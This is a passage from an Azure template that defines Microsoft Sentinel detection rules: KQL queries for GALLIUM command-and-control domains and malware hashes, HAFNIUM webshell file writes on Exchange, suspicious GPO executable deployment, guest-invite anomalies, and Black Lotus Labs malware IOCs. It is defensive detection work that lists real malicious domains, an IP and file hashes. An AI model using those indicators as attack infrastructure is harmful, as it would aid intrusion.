Host = SrcIpAddr \n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIPAddress, HostCustomEntity = Host \n), \n(_Im_NetworkSession (srcipaddr_has_any_prefix=IPList)\n | extend timestamp = TimeGenerated, IPCustomEntity = SrcIpAddr, HostCustomEntity = Hostname, AccountCustomEntity=User\n), \n(_Im_NetworkSession (dstipaddr_has_any_prefix=IPList)\n| extend timestamp = TimeGenerated, IPCustomEntity = DstIpAddr, HostCustomEntity = Hostname , AccountCustomEntity = User\n), \n(WireData  \n| where isnotempty(RemoteIP) \n| where RemoteIP in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = Computer \n), \n(SigninLogs \n| where isnotempty(IPAddress) \n| where IPAddress in (IPList) \n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress \n),\n(AADNonInteractiveUserSignInLogs \n| where isnotempty(IPAddress) \n| where IPAddress in (IPList) \n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress \n), \n(W3CIISLog  \n| where isnotempty(cIP) \n| where cIP in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = cIP, HostCustomEntity = Computer, AccountCustomEntity = csUserName \n), \n(AzureActivity  \n| where isnotempty(CallerIpAddress) \n| where CallerIpAddress in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = CallerIpAddress, AccountCustomEntity = Caller \n), \n( \nAWSCloudTrail \n| where isnotempty(SourceIpAddress) \n| where SourceIpAddress in (IPList) \n| extend timestamp = TimeGenerated, IPCustomEntity = SourceIpAddress, AccountCustomEntity = UserIdentityUserName \n), \n( \nDeviceNetworkEvents \n| where isnotempty(RemoteIP)  \n| where RemoteIP in (IPList)  \n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName  \n),\n(\nAzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (IPList)  \n| extend DestinationIP = DestinationHost \n| extend IPCustomEntity = SourceHost\n),\n(\nAzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallNetworkRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (IPList)  \n| extend DestinationIP = DestinationHost \n| extend IPCustomEntity = SourceHost\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "6ee72a9e-2e54-459c-bc9a-9c09a6502a63",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d49b4615-cb6e-4b34-86f0-fd9cd9bbc6bd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d49b4615-cb6e-4b34-86f0-fd9cd9bbc6bd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known GALLIUM domains and hashes",
          "description": "GALLIUM command and control domains and hash values for tools and malware used by GALLIUM. \n Matches domain name IOCs related to the GALLIUM activity group with CommonSecurityLog, DnsEvents, VMConnection and SecurityEvents dataTypes.\n References: https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/ ",
          "severity": "High",
          "enabled": true,
          "query": "let DomainNames = dynamic([\"asyspy256.ddns.net\",\"hotkillmail9sddcc.ddns.net\",\"rosaf112.ddns.net\",\"cvdfhjh1231.myftp.biz\",\"sz2016rose.ddns.net\",\"dffwescwer4325.myftp.biz\",\"cvdfhjh1231.ddns.net\"]);\nlet SHA1Hash = dynamic ([\"53a44c2396d15c3a03723fa5e5db54cafd527635\", \"9c5e496921e3bc882dc40694f1dcc3746a75db19\", \"aeb573accfd95758550cf30bf04f389a92922844\", \"79ef78a797403a4ed1a616c68e07fff868a8650a\", \"4f6f38b4cec35e895d91c052b1f5a83d665c2196\", \"1e8c2cac2e4ce7cbd33c3858eb2e24531cb8a84d\", \"e841a63e47361a572db9a7334af459ddca11347a\", \"c28f606df28a9bc8df75a4d5e5837fc5522dd34d\", \"2e94b305d6812a9f96e6781c888e48c7fb157b6b\", \"dd44133716b8a241957b912fa6a02efde3ce3025\", \"8793bf166cb89eb55f0593404e4e933ab605e803\", \"a39b57032dbb2335499a51e13470a7cd5d86b138\", \"41cc2b15c662bc001c0eb92f6cc222934f0beeea\", \"d209430d6af54792371174e70e27dd11d3def7a7\", \"1c6452026c56efd2c94cea7e0f671eb55515edb0\", \"c6b41d3afdcdcaf9f442bbe772f5da871801fd5a\", \"4923d460e22fbbf165bbbaba168e5a46b8157d9f\", \"f201504bd96e81d0d350c3a8332593ee1c9e09de\", \"ddd2db1127632a2a52943a2fe516a2e7d05d70d2\"]);\nlet SHA256Hash = dynamic ([\"9ae7c4a4e1cfe9b505c3a47e66551eb1357affee65bfefb0109d02f4e97c06dd\", \"7772d624e1aed327abcd24ce2068063da0e31bb1d5d3bf2841fc977e198c6c5b\", \"657fc7e6447e0065d488a7db2caab13071e44741875044f9024ca843fe4e86b5\", \"2ef157a97e28574356e1d871abf75deca7d7a1ea662f38b577a06dd039dbae29\", \"52fd7b90d7144ac448af4008be639d4d45c252e51823f4311011af3207a5fc77\", \"a370e47cb97b35f1ae6590d14ada7561d22b4a73be0cb6df7e851d85054b1ac3\", \"5bf80b871278a29f356bd42af1e35428aead20cd90b0c7642247afcaaa95b022\", \"6f690ccfd54c2b02f0c3cb89c938162c10cbeee693286e809579c540b07ed883\", \"3c884f776fbd16597c072afd81029e8764dd57ee79d798829ca111f5e170bd8e\", \"1922a419f57afb351b58330ed456143cc8de8b3ebcbd236d26a219b03b3464d7\", \"fe0e4ef832b62d49b43433e10c47dc51072959af93963c790892efc20ec422f1\", \"7ce9e1c5562c8a5c93878629a47fe6071a35d604ed57a8f918f3eadf82c11a9c\", \"178d5ee8c04401d332af331087a80fb4e5e2937edfba7266f9be34a5029b6945\", \"51f70956fa8c487784fd21ab795f6ba2199b5c2d346acdeef1de0318a4c729d9\", \"889bca95f1a69e94aaade1e959ed0d3620531dc0fc563be9a8decf41899b4d79\", \"332ddaa00e2eb862742cb8d7e24ce52a5d38ffb22f6c8bd51162bd35e84d7ddf\", \"44bcf82fa536318622798504e8369e9dcdb32686b95fcb44579f0b4efa79df08\", \"63552772fdd8c947712a2cff00dfe25c7a34133716784b6d486227384f8cf3ef\", \"056744a3c371b5938d63c396fe094afce8fb153796a65afa5103e1bffd7ca070\"]);\nlet SigNames = dynamic([\"TrojanDropper:Win32/BlackMould.A!dha\", \"Trojan:Win32/BlackMould.B!dha\", \"Trojan:Win32/QuarkBandit.A!dha\", \"Trojan:Win32/Sidelod.A!dha\"]);\n(union isfuzzy=true\n(CommonSecurityLog \n| parse Message with * '(' DNSName ')' * \n| where isnotempty(FileHash)\n| where FileHash in (SHA256Hash) or DNSName in~ (DomainNames)\n| extend Account = SourceUserID, Computer = DeviceName, IPAddress = SourceIP\n),\n( _Im_Dns(domain_has_any=DomainNames)\n| extend DNSName = DnsQuery\n| extend IPAddress = SrcIpAddr\n),\n(VMConnection \n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| where isnotempty(DNSName)\n| where DNSName  in~ (DomainNames)\n| extend IPAddress = RemoteIp\n),\n(Event\n//This query uses sysmon data depending on table name used this may need updataing\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Hashes = EventDetail.[16].[\"#text\"]\n| parse Hashes with * 'SHA1=' SHA1 ',' * \n| where isnotempty(Hashes)\n| where Hashes in (SHA1Hash) \n| extend Account = UserName\n),\n(SecurityAlert\n| where ProductName == \"Microsoft Defender Advanced Threat Protection\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where isnotempty(ThreatName)\n| where ThreatName has_any (SigNames)\n| extend Computer = tostring(parse_json(Entities)[0].HostName)\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (DomainNames)  \n| extend DNSName = DestinationHost \n| extend IPAddress = SourceHost\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "CredentialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "26a3b261-b997-4374-94ea-6c37f67f4f39",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.5.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0ba215f9-40cd-412f-897e-69f8a0134adb')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0ba215f9-40cd-412f-897e-69f8a0134adb')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "HAFNIUM UM Service writing suspicious file",
          "description": "This query looks for the Exchange server UM process writing suspicious files that may be indicative of webshells.\nReference: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
          "severity": "High",
          "enabled": true,
          "query": "let scriptExtensions = dynamic([\".php\", \".jsp\", \".js\", \".aspx\", \".asmx\", \".asax\", \".cfm\", \".shtml\"]);\nunion isfuzzy=true\n(SecurityEvent\n| where EventID == 4663\n| where Process has_any (\"umworkerprocess.exe\", \"UMService.exe\")\n| where ObjectName has_any (scriptExtensions)\n| where AccessMask in ('0x2','0x100', '0x10', '0x4')\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IpAddress\n),\n  (WindowsEvent\n| where EventID == 4663 and EventData has_any (\"umworkerprocess.exe\", \"UMService.exe\") and EventData has_any (scriptExtensions) \n| where EventData has_any ('0x2','0x100', '0x10', '0x4')\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend Process=tostring(split(NewProcessName, '\\\\')[-1])\n| where Process has_any (\"umworkerprocess.exe\", \"UMService.exe\")\n| extend ObjectName = tostring(EventData.ObjectName)\n| where ObjectName has_any (scriptExtensions)\n| extend AccessMask = tostring(EventData.AccessMask)\n| where AccessMask in ('0x2','0x100', '0x10', '0x4')\n| extend Account = strcat(EventData.SubjectDomainName,\"\\\\\", EventData.SubjectUserName)\n| extend IpAddress = tostring(EventData.IpAddress)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IpAddress\n),\n(imFileEvent\n| where EventType == \"FileCreated\"\n| where ActingProcessName has_any (\"umworkerprocess.exe\", \"UMService.exe\")\n  and\n  TargetFileName has_any (scriptExtensions)\n| extend timestamp = TimeGenerated, AccountCustomEntity = ActorUsername, HostCustomEntity = DvcHostname\n),\n(DeviceFileEvents\n| where ActionType =~ \"FileCreated\"\n| where InitiatingProcessFileName has_any (\"umworkerprocess.exe\", \"UMService.exe\")\n| where FileName has_any(scriptExtensions)\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingProcessAccountUpn, HostCustomEntity = DeviceName, IPCustomEntity = RequestSourceIP)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "7d6d8a8e-b08a-4082-8dbb-d7fd2cbbc35e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingProcessAccountUpn"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ea7082e4-af61-4077-b137-8e5584597062')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ea7082e4-af61-4077-b137-8e5584597062')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New EXE deployed via Default Domain or Default Domain Controller Policies (ASIM Version)",
          "description": "This detection highlights executables deployed to hosts via either the Default Domain or Default Domain Controller Policies. These policies apply to all hosts or Domain Controllers and best practice is that these policies should not be used for deployment of files.\n  A threat actor may use these policies to deploy files or scripts to all hosts in a domain.\n  This query uses the ASIM parsers and will need them deployed before usage - https://docs.microsoft.com/azure/sentinel/normalization",
          "severity": "High",
          "enabled": true,
          "query": "let known_processes = (\n  imProcess\n  // Change these values if adjusting Query Frequency or Query Period\n  | where TimeGenerated between(ago(14d)..ago(1d))\n  | where Process has_any (\"Policies\\\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\", \"Policies\\\\{31B2F340-016D-11D2-945F-00C04FB984F9}\")\n  | summarize by Process);\n  imProcess\n  // Change these values if adjusting Query Frequency or Query Period\n  | where TimeGenerated > ago(1d)\n  | where Process has_any (\"Policies\\\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\", \"Policies\\\\{31B2F340-016D-11D2-945F-00C04FB984F9}\")\n  | where Process !in (known_processes)\n  | summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by Process, CommandLine, DvcHostname",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "LateralMovement"
          ],
          "techniques": [
            "T1072",
            "T1570"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "0dd2a343-4bf9-4c93-a547-adf3658ddaec",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DvcHostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/eeb487a6-e88f-4be3-b039-34573803d474')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/eeb487a6-e88f-4be3-b039-34573803d474')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Defender for Cloud",
          "description": "Create incidents based on all alerts generated in Microsoft Defender for Cloud",
          "enabled": true,
          "productFilter": "Azure Security Center",
          "severitiesFilter": [
            "Low",
            "Medium",
            "High"
          ],
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "90586451-7ba8-4c1e-9904-7d1b7c3cc4d6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5d2b6cc6-4db0-404c-a3e1-8893f5a6030e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5d2b6cc6-4db0-404c-a3e1-8893f5a6030e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Guest Users Invited to Tenant by New Inviters",
          "description": "Detects when a Guest User is added by a user account that has not been seen adding a guest in the previous 14 days.\n  Monitoring guest accounts and the access they are provided is important to detect potential account abuse.\n  Accounts added should be investigated to ensure the activity was legitimate.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins",
          "severity": "Medium",
          "enabled": true,
          "query": "let inviting_users = (AuditLogs\n  | where TimeGenerated between(ago(14d)..ago(1d))\n  | where OperationName =~ \"Invite external user\"\n  | where Result =~ \"success\"\n  | extend invitingUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | where isnotempty(invitingUser)\n  | summarize by invitingUser);\n  AuditLogs\n  | where TimeGenerated > ago(1d)\n  | where OperationName =~ \"Invite external user\"\n  | where Result =~ \"success\"\n  | extend invitingUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | where isnotempty(invitingUser) and invitingUser !in (inviting_users)\n  | extend invitedUserPrincipalName = tostring(TargetResources[0].userPrincipalName)\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "572e75ef-5147-49d9-9d65-13f2ed1e3a86",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "invitingUser"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "invitedUserPrincipalName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ipAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f45b594a-befe-45b3-aa44-cbb637f02a80')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f45b594a-befe-45b3-aa44-cbb637f02a80')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Alert for  IOCs related to Windows/ELF malware - IP, Hash IOCs - September 2021",
          "description": "Identifies a match across various data feeds for IP,hashes and IOCs related to Windows/ELF malware published by Black Lotus Labs\nReference: \nhttps://blog.lumen.com/no-longer-just-theory-black-lotus-labs-uncovers-linux-executables-deployed-as-stealth-windows-loaders\nhttps://github.com/ManuelBerrueta/YARA-rules/blob/master/BlackLotusLabs-WSLMalware/BLL_SneakyWSL.yar",
          "severity": "Medium",
          "enabled": true,
          "query": "let IPList = dynamic([\"185.63.90.137\"]);  \nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\nlet sha256Hashes = \ndynamic([\"53854c6d163bfd0c56d8b297ac43bd25c21f696de6063031241e792ee65df441\",\n\"c297e545b8f150cc5ff56dbb68dc74fe30a421d9d40f38f4a53083192697c44c\",\n\"17921368901f23e0cad0d2fe4ce5694aebaf4727699ed0358117500701914d1b\",\n\"198a2d42df010d838b4207f478d885ef36e3db13b1744d673e221b828c28bf77\",\n\"71d7b48c2fdc7b57b104a7858a35165bbed21d2fa7e34828d6c1d50b2b33a1d0\",\n\"601227d52c6e367e11b80240183d07d38bc11a88e844e8401fce17eb25e92ba8\",\n\"63ff04bed4fdb120a9cb9b1ea7fd88e83f12fb01ab6a057088f8016e663b48d4\",\n\"a3037c3389b811bc1404f719af5c8b9034c5e24710cf3a0b457d28bf1b922cf7\",\n\"e19b8be1b21c066d60725e550f8455f824065abbf1b43f7b2fe4fb338b241ffc\",\n\"a3037c3389b811bc1404f719af5c8b9034c5e24710cf3a0b457d28bf1b922cf7\"\n]);\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or Message has_any (IPList) \n| project TimeGenerated, SourceIP, DestinationIP, Message, SourceUserID, RequestURL\n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", MessageIP in (IPList), \"Message\", \"NoMatch\")\n| extend timestamp = TimeGenerated, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, \"NoMatch\"), AccountCustomEntity = SourceUserID\n),\n(DeviceNetworkEvents\n| where  RemoteIP in (IPList) or InitiatingProcessSHA256 in (sha256Hashes) \n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP\n| extend timestamp = TimeGenerated, DNSName = RemoteUrl, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\n),\n(WindowsFirewall\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, Computer, CommunicationDirection, SourceIP, DestinationIP, SourcePort, DestinationPort\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\")\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost) \n| where SourceHost in (IPList) or DestinationHost in (IPList)\n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost\n),\n(DeviceFileEvents\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n| where FileHash in (sha256Hashes)\n),\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated,  Message, SourceUserID, FileHash\n| extend timestamp = TimeGenerated, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceEvents\n| where   InitiatingProcessSHA256 in~ (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(SecurityEvent\n| where EventID == '4688'\n| where CommandLine has_any (IPList) \n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName\n),\n(WindowsEvent\n| where EventID == '4688' and  has_any_ipv4(EventData, toscalar(IPList)) \n| extend NewProcessName = tostring(EventData.NewProcessName)\n| where NewProcessName  in (IPList) \n| extend ParentProcessName = tostring(EventData.ParentProcessName)\n| extend Account =  strcat(EventData.SubjectDomainName,\"\\\\\", EventData.SubjectUserName)\n| extend NewProcessId = tostring(EventData.NewProcessId)\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d992b87b-eb49-4a9d-aa96-baacf9d26247",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
